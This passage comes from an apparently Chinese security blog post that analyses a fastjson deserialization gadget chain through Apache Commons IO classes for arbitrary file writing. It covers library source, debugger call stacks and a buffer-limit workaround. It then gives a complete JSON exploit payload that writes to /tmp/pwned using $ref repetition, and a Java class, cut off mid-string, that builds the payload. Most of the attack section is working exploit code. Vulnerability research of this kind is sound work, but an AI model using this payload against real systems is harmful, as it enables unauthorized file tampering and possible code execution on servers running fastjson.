class="hljs-string">&quot;UTF-8&quot;</span>,<br>      <span class="hljs-string">&quot;bufferSize&quot;</span>: <span class="hljs-number">1024</span>,<br>      <span class="hljs-string">&quot;writeImmediately&quot;</span>: <span class="hljs-literal">true</span><br>    &#125;,<br>    <span class="hljs-string">&quot;closeBranch&quot;</span>:<span class="hljs-literal">true</span><br>  &#125;,<br>  <span class="hljs-string">&quot;httpContentType&quot;</span>:<span class="hljs-string">&quot;text/xml&quot;</span>,<br>  <span class="hljs-string">&quot;lenient&quot;</span>:<span class="hljs-literal">false</span>,<br>  <span class="hljs-string">&quot;defaultEncoding&quot;</span>:<span class="hljs-string">&quot;UTF-8&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><h5 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h5><p>XmlStreamReader 的构造函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">XmlStreamReader</span><span class="hljs-params">(InputStream is, String httpContentType,</span><br><span class="hljs-params">                       <span class="hljs-type">boolean</span> lenient, String defaultEncoding)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>    <span class="hljs-built_in">this</span>.defaultEncoding = defaultEncoding;<br>    <span class="hljs-comment">// 根据传进来的参数 is  封装 BOMInputStream</span><br>    <span class="hljs-type">BOMInputStream</span> <span class="hljs-variable">bom</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BOMInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(is, BUFFER_SIZE), <span class="hljs-literal">false</span>, BOMS);<br>    <span class="hljs-type">BOMInputStream</span> <span class="hljs-variable">pis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BOMInputStream</span>(bom, <span class="hljs-literal">true</span>, XML_GUESS_BYTES);<br>    <span class="hljs-comment">// 调用本类的 doHttpStream 方法</span><br>    <span class="hljs-built_in">this</span>.encoding = doHttpStream(bom, pis, httpContentType, lenient);<br>    <span class="hljs-built_in">this</span>.reader = <span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(pis, encoding);<br>&#125;<br><br><span class="hljs-keyword">private</span> String <span class="hljs-title function_">doHttpStream</span><span class="hljs-params">(BOMInputStream bom, BOMInputStream pis, String httpContentType,</span><br><span class="hljs-params">                            <span class="hljs-type">boolean</span> lenient)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>    <span class="hljs-comment">// 调用getBOMCharsetName方法</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">bomEnc</span>      <span class="hljs-operator">=</span> bom.getBOMCharsetName();<br>    <span class="hljs-type">String</span> <span class="hljs-variable">xmlGuessEnc</span> <span class="hljs-operator">=</span> pis.getBOMCharsetName();<br>    <span class="hljs-type">String</span> <span class="hljs-variable">xmlEnc</span> <span class="hljs-operator">=</span> getXmlProlog(pis, xmlGuessEnc);<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">return</span> calculateHttpEncoding(httpContentType, bomEnc,<br>                                     xmlGuessEnc, xmlEnc, lenient);<br>    &#125; <span class="hljs-keyword">catch</span> (XmlStreamReaderException ex) &#123;<br>        <span class="hljs-keyword">if</span> (lenient) &#123;<br>            <span class="hljs-keyword">return</span> doLenientDetection(httpContentType, ex);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">throw</span> ex;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>bom.getBOMCharsetName &#x3D;&gt; getBOM &#x3D;&gt; in.read() 这个我们在分析 BOMInputStream 读文件的时候，也有说到</p><p>我们给 in 赋值为 TeeInputStream , 他接受两个参数 输入流 input 和输出了 branch，而他的 read 方法里执行了 write 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">TeeInputStream</span><span class="hljs-params">(</span><br><span class="hljs-params">    <span class="hljs-keyword">final</span> InputStream input, <span class="hljs-keyword">final</span> OutputStream branch, <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> closeBranch)</span> &#123;<br>    <span class="hljs-built_in">super</span>(input);<br>    <span class="hljs-built_in">this</span>.branch = branch;<br>    <span class="hljs-built_in">this</span>.closeBranch = closeBranch;<br>&#125;<br><span class="hljs-comment">// TeeInputStream 的 read 方法</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">read</span><span class="hljs-params">(<span class="hljs-keyword">final</span> <span class="hljs-type">byte</span>[] bts, <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> st, <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> end)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>    <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">n</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">super</span>.read(bts, st, end);<br>    <span class="hljs-keyword">if</span> (n != EOF) &#123;<br>        branch.write(bts, st, n);<br>    &#125;<br>    <span class="hljs-keyword">return</span> n;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>这里 TeeInputStream 相当于是我们写文件的桥梁，他把我们 (InputStream ) 读取到的字节流，写进了 (OutputStream ) 输出的字节流，也正是因为有这一特性，我们才能进行任意文件的写入</p></blockquote><p>后面就是inpu t为 ReaderInputStream + CharSequenceReader 控制读取的内容</p><p>branch为 WriterOutputStream + FileWriterWithEncoding 控制写文件的路径</p><p>我们简单调试一下</p><h5 id="读取调用栈"><a href="#读取调用栈" class="headerlink" title="读取调用栈"></a>读取调用栈</h5><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250327153036531.png" alt="image-20250327153036531"></p><p>拿出来看一下</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-built_in">read</span>:<span class="hljs-number">112</span>, CharSequenceReader (org.apache.commons.<span class="hljs-built_in">io</span>.<span class="hljs-built_in">input</span>)<br><span class="hljs-built_in">read</span>:<span class="hljs-number">213</span>, ReaderInputStream (org.apache.commons.<span class="hljs-built_in">io</span>.<span class="hljs-built_in">input</span>)<br><span class="hljs-built_in">read</span>:<span class="hljs-number">99</span>, ProxyInputStream (org.apache.commons.<span class="hljs-built_in">io</span>.<span class="hljs-built_in">input</span>)<br><span class="hljs-built_in">read</span>:<span class="hljs-number">127</span>, TeeInputStream (org.apache.commons.<span class="hljs-built_in">io</span>.<span class="hljs-built_in">input</span>)<br>fill:<span class="hljs-number">252</span>, BufferedInputStream (java.<span class="hljs-built_in">io</span>)<br><span class="hljs-built_in">read</span>:<span class="hljs-number">271</span>, BufferedInputStream (java.<span class="hljs-built_in">io</span>)<br>getBOM:<span class="hljs-number">174</span>, BOMInputStream (org.apache.commons.<span class="hljs-built_in">io</span>.<span class="hljs-built_in">input</span>)<br>getBOMCharsetName:<span class="hljs-number">200</span>, BOMInputStream (org.apache.commons.<span class="hljs-built_in">io</span>.<span class="hljs-built_in">input</span>)<br>doHttpStream:<span class="hljs-number">439</span>, XmlStreamReader (org.apache.commons.<span class="hljs-built_in">io</span>.<span class="hljs-built_in">input</span>)<br>&lt;init&gt;:<span class="hljs-number">326</span>, XmlStreamReader (org.apache.commons.<span class="hljs-built_in">io</span>.<span class="hljs-built_in">input</span>)<br></code></pre></td></tr></table></figure><h5 id="写入调用栈"><a href="#写入调用栈" class="headerlink" title="写入调用栈"></a>写入调用栈</h5><p>读取完成后，我们会回到org.apache.commons.io.input.TeeInputStream#read(byte[], int, int) 执行 write() 函数</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250327153334028.png" alt="image-20250327153334028"></p><p>最终到 sun.nio.cs.StreamEncoder#implWrite(java.nio.CharBuffer) 执行写文件</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250327155323240.png" alt="image-20250327155323240"></p><p>我们的输入字节流就只有几个 a 字符， 肯定是不满足缓冲区溢出的。</p><p>可以看到我们的文件是没有内容的</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250327160437723.png" alt="image-20250327160437723"></p><h5 id="解决缓冲区问题"><a href="#解决缓冲区问题" class="headerlink" title="解决缓冲区问题"></a>解决缓冲区问题</h5><p>那我们要怎么解决这个问题呢？</p><p>你是不是像到我们把字符串写多一点不就行了</p><p>很可惜，这是不可行的。以为在传入的输入流和输出流对缓冲区大小做了限制</p><div class="group-image-container"><div class="group-image-row"><div class="group-image-wrap"><img src="https://gitee.com/ling-x5/img/raw/master/image-20250327160326236.png" alt="image-20250327160326236"></div></div><div class="group-image-row"><div class="group-image-wrap"><img src="https://gitee.com/ling-x5/img/raw/master/image-20250327160100829.png" alt="image-20250327160100829"></div></div></div><p><a href="https://rivers.chaitin.cn/blog/cq70jnqp1rhtmlvvdo2g">voidfyoo</a> 师傅已经给出了答案，利用<code>$ref</code> 引用特性循环输入解决这一问题，师傅公开的POC</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;x&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;input&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;reader&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.commons.io.input.CharSequenceReader&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;charSequence&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.String&quot;</span><span class="hljs-string">&quot;aaaaaa...(长度要大于8192，实际写入前8192个字符)&quot;</span><br>      <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;charsetName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;bufferSize&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1024</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;branch&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.commons.io.output.WriterOutputStream&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;writer&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.commons.io.output.FileWriterWithEncoding&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;file&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;/tmp/pwned&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;encoding&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;append&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><br>      <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;charsetName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;bufferSize&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1024</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;writeImmediately&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;trigger&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;is&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;input&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>          <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$.input&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;branch&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>          <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$.branch&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;closeBranch&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>      <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;httpContentType&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;text/xml&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;lenient&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;defaultEncoding&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;UTF-8&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;trigger2&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;is&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;input&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>          <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$.input&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;branch&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>          <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$.branch&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;closeBranch&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>      <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;httpContentType&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;text/xml&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;lenient&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;defaultEncoding&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;UTF-8&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;trigger3&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;is&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;input&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>          <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$.input&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;branch&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>          <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$.branch&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;closeBranch&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>      <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;httpContentType&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;text/xml&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;lenient&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;defaultEncoding&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;UTF-8&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h5 id="复现-2"><a href="#复现-2" class="headerlink" title="复现"></a>复现</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.poc;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">XmlWriteFile</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">4096</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">content</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;a&quot;</span>.repeat(count) +<span class="hljs-string">&quot;\n&quot;</span>+ <span class="hljs-string">&quot;b&quot;</span>.repeat(count)+<span class="hljs-string">&quot;c&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;  \&quot;x\&quot;:&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;@type\&quot;:\&quot;com.alibaba.fastjson.JSONObject\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;input\&quot;:&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;      \&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;      \&quot;@type\&quot;:\&quot;org.apache.commons.io.input.ReaderInputStream\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;      \&quot;reader\&quot;:&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;:\&quot;org.apache.commons.io.input.CharSequenceReader\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;charSequence\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.lang.String\&quot; \&quot;&quot;</span>+ content +<span class="hljs-string">&quot;\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;      &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;      \&quot;charsetName\&quot;:\&quot;UTF-8\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;      \&quot;bufferSize\&quot;:1024\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;branch\&quot;:&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;      \&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;      \&quot;@type\&quot;:\&quot;org.apache.commons.io.output.WriterOutputStream\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;      \&quot;writer\&quot;:&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;:\&quot;org.apache.commons.io.output.FileWriterWithEncoding\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;file\&quot;:\&quot;D:/WebSafe/JavaProject/fastjson/src/main/java/com/lingx5/poc/2.txt\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;encoding\&quot;:\&quot;UTF-8\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;append\&quot;: false\n&quot;</span> +<br>                <span class="hljs-string">&quot;      &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;      \&quot;charsetName\&quot;:\&quot;UTF-8\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;      \&quot;bufferSize\&quot;: 1024,\n&quot;</span> +<br>                <span class="hljs-string">&quot;      \&quot;writeImmediately\&quot;: true\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;trigger\&quot;:&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;      \&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;      \&quot;@type\&quot;:\&quot;org.apache.commons.io.input.XmlStreamReader\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;      \&quot;is\&quot;:&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;:\&quot;org.apache.commons.io.input.TeeInputStream\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;input\&quot;:&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;          \&quot;$ref\&quot;:\&quot;$.input\&quot;\n&quot;</span> +<br>                